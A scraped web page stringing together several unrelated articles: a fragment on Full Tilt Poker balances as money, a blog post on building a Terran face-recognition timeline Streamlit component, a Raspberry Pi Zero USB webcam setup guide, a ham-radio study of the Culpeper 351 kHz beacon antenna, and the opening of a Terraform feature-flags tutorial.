<p>In other words, a poker site issues IOUs to players. These IOUs are supposedly redeemable at any time (like the IOUs created by a bank). The IOUs created by Full Tilt Poker were largely treated as money by players of the site, to the point where they were used to facilitate real economic activity. For example, it was typical for players to settle small debts (like $10 for a movie ticket) by sending a player-to-player transfer on Full Tilt Poker instead of sending a bank transfer (because transfers on poker sites were typically faster and easier to make than bank transfers).</p>

<p>For all intents and purposes, the IOUs created by Full Tilt Poker were money. They simply were not counted as money due to accounting conventions. Now, some of you might be thinking <em>”Wait a minute… Doesn’t the poker site have all player funds in the bank? If all player funds have corresponding bank deposits, then those bank deposits would already be counted as money, and we wouldn’t want to double count that money.”</em> Yeah, I also thought that Full Tilt Poker had player funds in the bank (can you guess where this is going?).</p>
<p>On April 15, 2011, known in the poker world as <a href="https://en.wikipedia.org/wiki/United_States_v._Scheinberg" target="_blank">Black Friday</a>, the FBI raided offices of Full Tilt Poker and PokerStars as part of a larger crackdown on online gambling. This law enforcement action triggered an instant bank run by players: everyone …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><article><main><a href="https://pento.ai/blog/terran-meets-streamlit-components"><p>Terran's face recognition meets Streamlit Components</p></a></main><p>We can’t believe Streamlit is barely one year old now. Today, we can’t think of any better tool for creating a fast and interactive dashboard, demos, and visualizations. On top of that, they recently launched a new awesome feature called <a href="https://www.streamlit.io/components">Streamlit Components</a>. This new feature enables developers to create custom visualizations using your favorite front-end framework, namely React, Vue, or just plain HTML.</p><p>Especially, Streamlit is really convenient when starting new machine learning projects, making it super easy and fast to go from nothing to a proof of concept of a ML solution. Because of this, we use Streamlit pretty frequently: for project prototyping, dynamic reports, and for building cool demos 💅</p><p>Particularly, our open-source project Terran was not an exception to this. We've built a face-recognition timeline demo to demonstrate how easy it is to use Terran on YouTube videos, and additionally, how straightforward it is to create amazing visualizations using the new Streamlit Components! 🚀</p><p>In this blog post, we'll share how the process of building this component was, and hopefully, inspire you to build your own component or demo using Terran!</p><p>Our demo consists of the following:</p><ol><li>You take any video from YouTube that has people in it, for example, <a href="https://youtu.be/mbdOqxdiSZc" target="blank" rel="noopener">this Big Bang Theory video</a>.</li><li>Then, we use Terran to detect all the faces that appear in the video, and when they actually appear on the screen.</li><li>Finally, we create a timeline visualization that shows in green when someone is present in the video.</li><li>Optionally, we can make it dynamic so that when the user clicks on a specific time of the timeline, a video player is rendered and it'll begin playing starting from the second the user clicked.</li></ol><p>The final result looks like this</p><a id="what_is_terran" href="#what_is_terran"></a><p><img src="https://pento.ai/images/blog/terran-square.svg" alt="Terran face-recognition timeline"></p><p>Terran is our open-source human perception library. We focus on providing open, auditable, and performant alternatives to closed approaches. Solutions that can run on your computer or device and that will adapt to the environment that it's in. But most importantly, code that you can test (without piling-up costs), understand and modify to your needs.</p><p>You can check out the <a href="https://pento.ai/blog/introducing-terran">Terran's introduction blog post</a> to know more about this project! Also, you can support our project and give it a try and why not a star in Github 💫</p><a id="using_terran's_face-recognition_modules" href="#using_terran's_face-recognition_modules"></a><p>The demo consists of automatically detecting and tracking faces on YouTube videos. With this information, we can generate timeline charts showing specifically when each person appears on the screen or not. The idea then is to use Terran's face-recognition library to generate all the data needed to create a timeline visualization, and then we can create a new Streamlit Component to create a fancy and interactive timeline chart!</p><p>We can split the processes into the following steps:</p><ol><li>Generate the timeline data from a YouTube video using Terran</li><li>Bootstrapping your Streamlit Component and declare the input/output data bindings</li><li>And creating a custom and interactive visualization tool using React and D3</li></ol><p>Let's dive in!</p><a id="generate_the_timeline_data_from_a_youtube_video_using_terran" href="#generate_the_timeline_data_from_a_youtube_video_using_terran"><h2>Generate the timeline data from a YouTube video using Terran</h2></a><p>This is pretty simple. Using Terran's <code>open_video</code> we will iterate through the video's frames, and using the functions <code>face_detection</code> and <code>extract_features</code> we'll detect for each frame where the faces are and a vector representation -features- of each face.</p><p><img src="https://pento.ai/images/blog/terran-streamlit-diagram.jpg" alt="Terran Streamlit timeline generator diagram"></p><p>Then, we can start comparing the extracted features to know if we're talking about the same person or not, we can do a simple <code>cosine_distance</code> threshold to know if that's the case.</p><p>Finally, we create a data structure that stores for each detected person all the frame indexes in which they appear, and that's it!</p><p><img src="https://pento.ai/images/blog/terran-streamlit-structure.jpg" alt="Terran Streamlit timeline generator data structure"></p><p>We created a function <code>generate_timeline</code> that does this exact same logic, plus some other minor features. When being used, it looks as simple as this:</p><pre><pre><code>from streamlit_terran_timeline import generate_timeline

timeline = generate_timeline("https://youtu.be/mbdOqxdiSZc")
</code></pre></pre><a id="bootstrap_your_streamlit_component_and_declare_the_input/output_data_bindings" href="#bootstrap_your_streamlit_component_and_declare_the_input/output_data_bindings"><h2>Bootstrap your Streamlit Component and declare the input/output data bindings</h2></a><p>This step might work differently for you depending on your frontend skills. In particular, we're more into working with React, so this <a href="https://github.com/streamlit/component-template/tree/master/template">Streamlit Component template</a> was great for setting up the demo.</p><p>We think the way of integrating new components to Streamlit is very smart: just assume that you can send all the data you need to build the component as long as this data can be JSON serialized. Additionally, our template will declare our component in a developing stage, so that it is easier for us to adjust our frontend with hot reloading as we make changes. You can go to the <a href="https://docs.streamlit.io/en/stable/streamlit_components.html">official Streamlit documentation</a> for more details.</p><p>To declare the bidings of our component, we create our component function called <code>terran_timeline</code> like this:</p><pre><pre><code>def terran_timeline(timeline, key=None):
    component_value = _component_func(timeline=timeline, key=key, default=0)

    return component_value
</code></pre></pre><p>...where the <code>_component_func</code> is the one that declares our Streamlit Component and we are saying that we want to send a data structured by the name of <code>timeline</code> to this component. The additional <code>key</code> argument makes it possible to have multiple components of the same kind by specifying different keys, and the <code>default</code> argument stands for the default return value of the component, which in this case means starting second value for the video.</p><a id="create_a_custom_and_interactive_visualization_tool_using_react_and_d3" href="#create_a_custom_and_interactive_visualization_tool_using_react_and_d3"><h2>Create a custom and interactive visualization tool using React and D3</h2></a><p>Then we have to move into the React world and start building our component. The good news is that we can retrieve the <code>timeline</code> object inside our component super easily!</p><pre><pre><code>public render = (): ReactNode =&gt; {
    const timeline = this.props.args["timeline"]
    ...
}
</code></pre></pre><p>Also, we can make our component "return" a value using the <code>Streamlit.setComponentValue</code> function they provide in the template, for example, making that when the user clicks on the timeline widget</p><pre><pre><code>//
// If the user clicks on the timeline, we set the component value to the
// time in seconds where the user clicked
//
Streamlit.setComponentValue(seekTimeSecond);
</code></pre></pre><p>The rest is mostly plain React and D3 stuff we think it's not worth focusing on this blog, but if you are interested you can check how it was implemented in our <a href="https://github.com/pento-group/streamlit-terran-timeline">streamlit-terran-timeline repo</a>.</p><p>Here's an example of what it looks like to use this new Streamlit Component:</p><pre><pre><code>import streamlit as st
from streamlit_terran_timeline import generate_timeline, terran_timeline

# Generate the timeline information
video_url = "https://youtu.be/mbdOqxdiSZc"
timeline = generate_timeline(video_url)

#
# Display the timeline. If the users click, you'll get the exact second of
# the part of the timeline video. By default, it returns 0.
#
start_time = terran_timeline(timeline)

#
# Display the video. Optionally, the user might click the timeline and start the video
# from a different time
#
st.video(video_url, start_time=start_time)
</code></pre></pre><p>In summary, the Streamlit Components feature is a game-changer. It was never more straightforward for us to create dynamic, reliable, and nice-looking pilot projects or demos from scratch. It's also really amazing that the Streamlit community is building new components and we're really thrilled to contribute with ours! If you are interested, you can see a full list of published and upcoming components <a href="https://discuss.streamlit.io/t/streamlit-components-community-tracker/4634">in this community post</a> .</p><p>This is the first of many upcoming Terran demos, so stay in touch to know what other cool stuff we're building!

<p>In <a href="http://www.davidhunt.ie/raspberry-pi-high-quality-camera-setup-for-low-latency-video-conferencing/">my previous article</a>, I described how to set up a Raspberry Pi High Quality camera as an IP camera, and use IP Camera Adapter to plug this into your favourite video conference software. Now, go one better, with just a singe USB cable and zero networking!</p>



<p>Using a Raspberry Pi Zero with its on-the-go USB port in ‘peripheral’ mode, we can make the Pi look like a USB webcam. And what’s even better is that Windows will recognise it as a Camera and automatically install the drivers for you. </p>



<p>Here’s a video of the setup, with demo of it booting.</p>



<figure><p>
<iframe id="_ytid_12097" width="840" height="473" data-origwidth="840" data-origheight="473" src="https://www.youtube.com/embed/idD61VOJ024?enablejsapi=1&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;modestbranding=0&amp;rel=1&amp;fs=1&amp;playsinline=0&amp;autohide=2&amp;theme=dark&amp;color=red&amp;controls=1&amp;" title="YouTube player" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe>
</p></figure>



<p>So the first thing to do is install RaspiOS on an SD Card, and enable the camera. There’s plenty of howto’s out there on how to do that. 🙂  This is usually done while the Pi is connected to a monitor so you can run raspi-config to enable the camera, ssh, configure WiFi, etc. Later on on the article we’ll power down the pi and plug it into a USB port on a Windows PC.</p>



<p>All the scripts needed for this are in a repo on GitHub. It’s a forked version of uvc-gadget, with additional systemd and configuration scripts. </p>



<p>So let’s checkout the software. As the pi user, checkout the repo. You may need to install git.</p>



<pre>sudo apt-get install git
cd /home/pi
git clone https://github.com/climberhunt/uvc-gadget.git</pre>



<p>That will create a uvc-gadget directory, so lets configure the system now. We need to create a systemd service. I’ve supplied a file for this, which looks as follows. It just runs the piwebcam script, which creates the multifunction device and runs the uvc-gadget application.</p>



<pre>[Unit]
Description=Start pi webcam service

[Service]
ExecStart=/home/pi/piwebcam
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=piwebcam
User=pi
Group=pi
WorkingDirectory=/home/pi/

[Install]
WantedBy=basic.target</pre>



<p>To install this, just copy the file into the correct location, and enable it:</p>



<pre>sudo cp piwebcam.service /etc/systemd/system/
sudo systemctl enable piwebcam</pre>



<p>Next, edit the kernel command line parameters at /boot/cmdline.txt, adding the following at the end of the “console” line. This enables the on-the-go mode of the USB interface, and allows us to create a multi-fuction gadget on top.</p>



<pre>modules-load=dwc2,libcomposite</pre>



<p>Also edit the boot config, adding an extra line at the end containing:</p>



<pre>dtoverlay=dwc2</pre>



<p>Now to build the uvc-gadget app, just run ‘make’ in the uvc-gadget directory:</p>



<pre>cd /home/pi/uvc-gadget
make</pre>



<p>All going well, you should now have the uvc-gadget binary ready to be executed at the next boot.</p>



<p>Next to set up the new serial device /dev/ttyGS0 to present a login prompt at boot. For that, we run the following command to cause systemd to run a getty (all one command, not separate lines)</p>



<pre>sudo ln -s /lib/systemd/system/getty@.service  /etc/systemd/system/getty.target.wants/getty@ttyGS0.service</pre>



<p>One of the scripts that’s called as part of the piwebcam service startup us multi-gadget, which was published on the Raspberry Pi forums in <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=148361#p1650640">a post by g.letourneur</a>, and I added the extra serial gadget functionality from a few other posts. Here’s the script for reference. The main differences are the tweaks for 1080p video, and the addition of a few lines to create a serial device endpoint (acm.usb0).</p>

<p> That thread was and excellent source of information, and discussed some solutions using g_webcam and others using configfs. I went with configfs, as it seems to be the preferred options these days. Other references are listed below at the end of the article. </p>



<p>Now, power down your Pi Zero, and plug the USB cable into the USB port marked “USB” (not the one marked “PWR”), and the other end into your PCs USB port and see if the serial gadget comes up in Windows Device Manager. We’ll be running the Pi headless from now on with access via USB-serial or WiFi. </p>



<figure><img loading="lazy" width="781" height="541" src="http://www.davidhunt.ie/wp-content/uploads/2020/05/dm.png" alt="" srcset="http://www.davidhunt.ie/wp-content/uploads/2020/05/dm.png 781w, http://www.davidhunt.ie/wp-content/uploads/2020/05/dm-300x208.png 300w, http://www.davidhunt.ie/wp-content/uploads/2020/05/dm-768x532.png 768w" sizes="(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px"></figure>



<p>Here we can see that both the UVC camera and the serial device are now present in Device Manager on Windows. You should be able to connect a serial terminal to the Pi, and log in at the prompt. This saves you having to have the webcam connected to WiFi in order to login to tweak things. Use 115200 baud to connect.</p>



<figure><img loading="lazy" src="http://www.davidhunt.ie/wp-content/uploads/2020/05/comport.png" alt="" width="600" height="400"></figure>



<p>Next, open up your camera app, and you should now see the output of the camera. You should be able to use the camera an any of your favourite video capture or video conferencing apps. </p>



<p>With a Raspberry Pi zero W, and using a class 10 SD card (~20MB/sec), the piwebcam boots in about 35 seconds. There’s lots of articles with tips and tricks on reducing this time, I didn’t manage to get configuration below 25 seconds,  but didn’t spend too long at it. It should be possible to do better. </p>



<p>With the Raspberry Pi Zero at about £5 /€5.50, the Camera at £50/€55, and the standard wide(ish) angle lens at £25/€27.50, that’s a VERY decent interchangeable lens setup for about £80/€85. </p>



<p>Next to see if it’s possible to get 4k out of it! 😉</p>

<h2>Culpeper Non Directional Beacon (NDB)</h2>
<figure id="attachment_4060" aria-describedby="caption-attachment-4060"><a href="https://en.wikipedia.org/wiki/Non-directional_beacon"><img loading="lazy" title="NDB aeronautical chart symbol" src="https://www.hamradio.me/wp-content/uploads/2020/05/NDB-480.png" alt="NDB aeronautical chart symbol" width="480" height="240" data-pin-title="NDB aeronautical chart symbol" data-pin-description="NDB aeronautical chart symbol" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/NDB-480.png 480w, https://www.hamradio.me/wp-content/uploads/2020/05/NDB-480-450x225.png 450w" sizes="(max-width: 480px) 100vw, 480px"></a><figcaption id="caption-attachment-4060">Figure 4 – NDB aeronautical chart symbol</figcaption></figure>
<p>This navigation aid is five miles south-south-west of Culpeper Regional Airport providing a runway center line fix for inbound aircraft. <a href="http://airnav.com/" target="_blank" rel="noopener noreferrer">Airnav.com</a> confirms this beacon is still in use and provides details…</p>
<ul>
<li>Frequency: 351 kHz</li>
<li>Morse ID: MSQ</li>
<li>Power: 25 watts</li>
</ul>
<p>Authorities have been decommissioning these beacons aplenty, but this one still is heard where I live 13 miles north.&nbsp; The car’s AM radio confirms some desense so it clearly has energy in its near-field.</p>
<p>There use to be a beacon on the airport premises, but that is long gone as are a great many others in Virginia.&nbsp; For whatever reason, MSQ still exists.</p>
<h2>Medium Frequency Beacon</h2>
<p>In the US, airway beacons operate between 190 and 535 kHz so technically straddle the 1000 meter wavelength line between LF and MF bands.&nbsp; Such long wavelengths present an economic and engineering challenge to the transmitting station designer and builder.&nbsp; An eyeball survey suggests the tower height at this station is about 90 feet (~27 m) based on nine sections of tower.&nbsp; With this in mind, the design challenge becomes familiar to mobile amateur operators attempting 80 and 40m on their vehicles, but at a much larger scale.</p>
<figure id="attachment_4015" aria-describedby="caption-attachment-4015"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/MarconiComparison-650x522.png" alt="The design challenge for electrically short monopole antennas" width="650" height="522" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/MarconiComparison-650x522.png 650w, https://www.hamradio.me/wp-content/uploads/2020/05/MarconiComparison-450x361.png 450w, https://www.hamradio.me/wp-content/uploads/2020/05/MarconiComparison.png 653w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-4015">Figure 5 – The design challenge for electrically short monopole antennas</figcaption></figure>
<p>Compared to the exemplar Marconi 1/4 wave monopole, the NDB station antenna is minute.&nbsp; As the above height comparison reveals, the beacon facility has a very electrically-short radiator.&nbsp; At 351 kHz frequency, we’re dealing with a wavelength of over a half mile (.85 km) so any small antenna system that is going to radiate this 25 watts effectively deserves a study.</p>
<h2>Starting at the bottom</h2>

<p>My guess is the transmitter gear is housed in the right yellow box next to the ac power feed.&nbsp; The large diameter conduit connects the transmitter to the left yellow box I assume is nothing more than a passive antenna matching system.</p>
<p>The tower appears to be of simple galvanized steel construction with impressive insulator supports.</p>

<h2>The feedpoint</h2>
<p>Have a look at… <strong>THIS!!!</strong></p>
<figure id="attachment_3991" aria-describedby="caption-attachment-3991"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-051_bl_1.jpg" alt="Transmitter with its high voltage terminal supply energy to the insulated tower." width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-051_bl_1.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-051_bl_1-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-3991">Figure 10 – Transmitter with its high voltage terminal supplies energy to the insulated tower.</figcaption></figure>
<p>Many of you are probably thinking “All this?&nbsp; For just 25 watts!?!”&nbsp; Indeed an electrically short antenna requires a bit of Smith chart extremes in the matching department that involve high voltages as we will see in the analysis below.&nbsp; Hams being hams, we focus on details like terminals so let’s do just that.</p>
<figure id="attachment_3992" aria-describedby="caption-attachment-3992"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-051_bl_2.jpg" alt="" width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-051_bl_2.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-051_bl_2-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-3992">Figure 11 – Transmitter antenna terminal</figcaption></figure>

<p>And that’s it!&nbsp; Not really all that extravagant.</p>
<h2>Hmmm, what about lightning, surge, etc.</h2>
<p>The tower is electrically isolated from ground and energized by the copper wire from the yellow box.&nbsp; Assuming the guying system does not ground the tower, we should wonder how electrical charge buildup or lightning events find a way to earth.&nbsp; If you were paying attention to the photos above of the insulator terminal, you see a piece of metal behind it. Here are better views…</p>
<figure id="attachment_4001" aria-describedby="caption-attachment-4001"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200517-017_bl_1.jpg" alt="" width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200517-017_bl_1.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200517-017_bl_1-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-4001">Figure 13 – Feedpoint of MSQ LF Beacon</figcaption></figure>

<p>The gap is pretty large at around an inch or so.&nbsp; I assume some sort of static drain is built into the transmitter/matching system leaving this gap to provide last effort shunting only for, I assume, lightning events.&nbsp; This is just a guess, but I think a reasonable one.</p>
<figure id="attachment_4003" aria-describedby="caption-attachment-4003"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200517-017_bl_3.jpg" alt="" width="650" height="521" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200517-017_bl_3.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200517-017_bl_3-450x361.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-4003">Figure 16&nbsp; – Warning label near antenna terminal</figcaption></figure>
<p>No kidding: I have little doubt this sign is to be taken seriously.</p>
<h2>Going up the tower – insulated guy wires</h2>
<p>This tower has three sets of guy wires. The bottom and middle set look like this.</p>
<figure id="attachment_3981" aria-describedby="caption-attachment-3981"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-039_bl.jpg" alt="" width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-039_bl.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-039_bl-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-3981">Figure 17 – Lower insulated guy wires.</figcaption></figure>
<p>It’s hard to tell in the photo, but the galvanized wire loop around the tower legs ends in a bolt shared with what appears to be non-conductive line.&nbsp;&nbsp; Here’s a close up of the guy on the right.</p>
<figure id="attachment_4017" aria-describedby="caption-attachment-4017"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-039_bl_2.jpg" alt="Lower insulated guy wires." width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-039_bl_2.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-039_bl_2-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-4017">Figure 18 – Lower insulated guy wires.</figcaption></figure>
<p>The attachment guys are marginally connected electrically, being just wrapped a bit around the tower leg.&nbsp; However, the remaining length past the bolt appears non conductive.&nbsp; Breaking up or otherwise ensuring guy wires do not interfere with the operation of an active vertical radiator makes perfect sense.</p>
<h2>Top of the tower – non-insulated guy wires</h2>
<p>At the top of the tower we find something completely different.</p>
<figure id="attachment_3982" aria-describedby="caption-attachment-3982"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-040_bl_1.jpg" alt="Upper non-insulated guy wires." width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-040_bl_1.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-040_bl_1-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-3982">Figure 19 – Upper non-insulated guy wires.</figcaption></figure>
<p>We see the same galvanized wire wrapping around the tower posts, but there are some extra wires involved. Let’s have a closer look…</p>
<figure id="attachment_3983" aria-describedby="caption-attachment-3983"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-040_bl_2.jpg" alt="Upper non-insulated guy wires." width="520" height="650" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-040_bl_2.jpg 520w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-040_bl_2-360x450.jpg 360w" sizes="(max-width: 520px) 100vw, 520px"><figcaption id="caption-attachment-3983">Figure 20 – Upper non-insulated guy wires showing jumpers.</figcaption></figure>
<p>It’s a little difficult to see, but an extra pigtail of galvanized wire is spliced into the main guy and then clamped securely to the tower lattice.&nbsp; It’s clear the designer meant for these guy wires to have a secure electrical connection to the top of the tower while providing mechanical support.</p>
<h2>Antenna top hat</h2>
<p>Here’s a view up the tower showing all three sets of guys.</p>
<figure id="attachment_3993" aria-describedby="caption-attachment-3993"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-054_bl.jpg" alt="" width="650" height="433" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-054_bl.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-054_bl-450x300.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-3993">Figure 21 – View of tower showing lower and mid insulated guy wires along with connected top guy wires for a top hat.</figcaption></figure>
<p>We see the lower and middle guy wires with a darker guy material plus those transition clamps close to the tower.&nbsp; The electrically connected galvanized top guy wires go out a bit and appear to terminate at transition points at the red arrows (below).&nbsp; Assuming these transition points insulate these wires from the remainder of the mechanical guying system, we have three spokes of an antenna top hat.</p>
<figure id="attachment_3994" aria-describedby="caption-attachment-3994"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-054_bl_gm.jpg" alt="View of tower showing lower and mid insulated guy wires along with connected top guy wires for a top hat." width="650" height="433" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-054_bl_gm.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-054_bl_gm-450x300.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-3994">Figure 22 – View of tower highlighting the end points of the top hat guy wires.</figcaption></figure>
<p>So far all the rules of operating an electrically short antenna are in play with this particular beacon transmitting station.</p>
<h2>Transmitter/Matcher/Tower grounding</h2>
<p>Copper wires from the yellow boxes and what appears to be numerous radials tie together and clamp to one tower leg.</p>
<figure id="attachment_4010" aria-describedby="caption-attachment-4010"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-052_bl_1.jpg" alt="Transmitter and tower grounding." width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-052_bl_1.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-052_bl_1-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-4010">Figure 23 – Transmitter and tower grounding.</figcaption></figure>
<p>Here is a closer view of that big bundle of assumed radials.</p>
<figure id="attachment_4011" aria-describedby="caption-attachment-4011"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-052_bl_2.jpg" alt="Transmitter and tower grounding to radials." width="650" height="520" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200516-052_bl_2.jpg 650w, https://www.hamradio.me/wp-content/uploads/2020/05/20200516-052_bl_2-450x360.jpg 450w" sizes="(max-width: 650px) 100vw, 650px"><figcaption id="caption-attachment-4011">Figure 24 – Transmitter and tower grounding to radials.</figcaption></figure>
<p>That’s about all I can tell from these photos.&nbsp; I usually see radials head straight into the ground rather than through the weather cap we see here.&nbsp; Perhaps this protects the radial wires from the weed trimmer making it a bit easier for cleaning crews to do their work.</p>
<h2>Guy wire ground termination</h2>
<p>Eventually the guy wires re-connect with galvanized wire well away from the tower and terminate at the tie points with the usual grounding system.</p>
<figure id="attachment_3978" aria-describedby="caption-attachment-3978"><img loading="lazy" src="https://www.hamradio.me/wp-content/uploads/2020/05/20200511-004_bl.jpg" alt="" width="520" height="650" srcset="https://www.hamradio.me/wp-content/uploads/2020/05/20200511-004_bl.jpg 520w, https://www.hamradio.me/wp-content/uploads/2020/05/20200511-004_bl-360x450.jpg 360w" sizes="(max-width: 520px) 100vw, 520px"><figcaption id="caption-attachment-3978">Figure 25 – Guy wires for “hot” low frequency beacon tower.</figcaption></figure>
<h2>Electrical analysis of this 351 kHz beacon</h2>
<p>We can perform a basic NEC analysis with these guesstimates…</p>

<p>The analysis below is ultra basic and only models the approximate lengths of perfectly conducting radiators of small diameter.&nbsp; It’s only here to show the purpose of the top hat feature and highlight the large voltage at the feedpoint.&nbsp; All that said, let’s proceed.</p>
<h3>NEC Structure for low frequency beacon</h3>

<p>Notice the top hat wires do a good job of of moving the low current, high voltage tips away from the tower top to allow the vertical monopole to maintain good current magnitude along the entire height.&nbsp; Hence the purpose of a top hat.</p>
<h3>NEC Parameters for low frequency beacon</h3>

<p>This is the voltage across the source near the bottom of the vertical wire (little magenta circle).&nbsp; Both the Voltage and Impedance values confirm this antenna is very capacitive.&nbsp; Despite the best efforts of the top hat, this antenna is still electrically short.&nbsp; A conjugate antenna matching system, the big yellow box, is essential.&nbsp; With only 25 watts, this simulation suggests the reactive voltage on the tower is very high.</p>

<p>Terraform offers lots of flexibility in coding Infrastructure as Code (IaC) deployments. Using Feature Flags and Environment Toggles can help in increasing the flexibility of the Terraform code to better handle multi-Environment deployments. They can also be used to conditionally deploy certain resources and configurations. These are techniques and design patterns that are greatly helpful to better control what resources are deployed and making multi-Environment maintenance easier to handle.</p>



<p>Let’s get started!</p>








<blockquote><p><strong>Related</strong>: If you’re new to Terraform, or are looking for a bit more information, then we recommend you check out our “<a href="https://build5nines.com/get-started-with-terraform-on-microsoft-azure/">Get Started with Terraform on Azure</a>” article. This will give you a great jump start to both using Terraform for infrastructure automation, as well as some tips on using it with Microsoft Azure.</p></blockquote>



<br><h2><span id="why_use_feature_flags_and_environment_toggles"></span>Why use Feature Flags and Environment Toggles?<span></span></h2>



<p>Feature Flags and Environment Toggles are very common techniques in software development that enable you to implement switches in software so that the code can be released into production but keep certain featured disabled until they are ready to be used. This can help hide features until public availability, or even keep them turned off until they are fully tested and debugged. These techniques allow you to release code to production more quickly and often while maintaining a single source code branch (such as <code>main</code> or <code>master</code>).</p>



<p>Then when the features are ready, you simply turn them on as the code is already out there. This can be done by modifying a configuration file or a build pipeline without requiring the source code to be completely rebuilt. In traditional CI/CD (Continuous Integration / Continuous Deployment) workflows, you can perform a promotion strategy of releasing / deploying the code up through the various environments; such as DEV -&gt; TEST -&gt; STAGE -&gt; PROD. By reusing the same binaries and flipping the feature flags and environment toggles on the releases, the deployment process will incur less risk of file corruption or accidentally deploying untested / unproven code.</p>



<p>The same feature flag and environment toggles can be used in an Infrastructure as Code (IaC) deployment for managing Infrastructure using a tool like Terraform to borrow some of the software development best practices to help build more reliable and flexible infrastructure deployments.</p>



<h2><span id="implement_terraform_feature_flags"></span>Implement Terraform Feature Flags<span></span></h2>



<p>Terraform uses the HashiCorp Configuration Language (HCL) as a programming language to declaratively define the configuration of an Infrastructure as Code (IaC) deployment. As with any other program, it has the ability to define variables, loops, and conditions; among other features built into the language. These features enable the ability to build out IaC that can be built to share code with and be flexible when deploying to multiple environments. This is done by implementing feature flags in the code.</p>



<p>Feature flags enable you to flip certain configurations within the Terraform project, or even pass in variables to the project on deployment to customize the IaC being deployed to meet environment or even multi-tenant requirements. Depending on the infrastructure needed, you can use feature flags with the main Terraform project or within Terraform modules used by one or more Terraform projects.</p>



<blockquote><p>Feature flags in Terraform enable you to conditionally deploy certain resources within the project by configuring individual flags that can be configured differently by environment or even to turn of deploying resources for something that isn’t ready to be deployed yet. This is a great way to build a single Terraform project with a single code base to be used to provisioning multiple environments that may need to be different in some fashion.</p></blockquote>



<br><h3><span id="resource_feature_flags"></span>Resource Feature Flags<span></span></h3>



<p>Resource blocks in Terraform are used to define the infrastructure deployment for specific resources based on the specific Terraform resource provider being used. One easy way to define Feature flags to be used is to add them as <code>local</code> variables in the Terraform project. This enables a sort of static feature flag to be configured and then checked into source control with the rest of the Terraform project.</p>



<p>To define the feature flag, the typical approach is to define a single, <code>local</code> boolean variable for the feature the needs to be wrapped in a feature flag. Then you can set the feature flag variable to either <code>true</code> or <code>false</code> to turn the feature on or off in the project. This can be used to easily write the Terraform for infrastructure that’s needed, but keep the feature flag set to <code>false</code> to remain “turned off” until the work is finished or it needs to be deployed when the Terraform project is applied via the <code>terraform apply</code> command.</p>



<p>The <code>local</code> variable for a feature flag can be defined as follows:</p>



<pre><code>locals {
  provision_b59func = true
}</code></pre>



